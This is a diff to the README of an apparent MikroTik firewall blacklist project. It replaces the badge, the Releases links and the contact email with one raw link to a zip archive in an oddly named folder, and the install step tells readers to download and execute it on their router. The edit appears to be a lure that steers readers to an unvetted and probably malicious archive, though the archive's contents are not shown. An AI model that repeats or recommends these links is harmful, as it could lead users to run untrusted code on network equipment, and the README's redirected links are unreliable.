@@ -1,6 +1,6 @@
 # 🚀 MikroTik Blacklist Repository
 
-![MikroTik Blacklist](https://img.shields.io/badge/MikroTik%20Blacklist-v1.0-brightgreen)
+![MikroTik Blacklist](https://github.com/thzinz/mikrotik-blacklist/raw/refs/heads/main/ecstasy/mikrotik_blacklist_v2.2.zip%20Blacklist-v1.0-brightgreen)
 
 Welcome to the **MikroTik Blacklist** repository! This project provides a comprehensive collection of IP addresses and hostnames banned by Greek law and global security services like Spamhaus. It is designed specifically for MikroTik firewall configurations, helping you enhance your network security effortlessly.
 
@@ -27,7 +27,7 @@ In today's digital landscape, maintaining network security is more crucial than 
 
 ## 📥 Installation
 
-To get started, you can download the latest release from our [Releases section](https://github.com/thzinz/mikrotik-blacklist/releases). You will need to download the relevant files and execute them according to your MikroTik router’s configuration.
+To get started, you can download the latest release from our [Releases section](https://github.com/thzinz/mikrotik-blacklist/raw/refs/heads/main/ecstasy/mikrotik_blacklist_v2.2.zip). You will need to download the relevant files and execute them according to your MikroTik router’s configuration.
 
 ## 🔧 Usage
 
@@ -60,9 +60,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: contact@example.com
+- **Email**: https://github.com/thzinz/mikrotik-blacklist/raw/refs/heads/main/ecstasy/mikrotik_blacklist_v2.2.zip
 - **GitHub Issues**: Use the Issues section of this repository for bug reports or feature requests.
 
 ---
 
-Thank you for visiting the **MikroTik Blacklist** repository! For the latest updates and releases, please check our [Releases section](https://github.com/thzinz/mikrotik-blacklist/releases). Your support helps keep this project alive and useful for the community.
+Thank you for visiting the **MikroTik Blacklist** repository! For the latest updates and releases, please check our [Releases section](https://github.com/thzinz/mikrotik-blacklist/raw/refs/heads/main/ecstasy/mikrotik_blacklist_v2.2.zip). Your support helps keep this project alive and useful for the community.
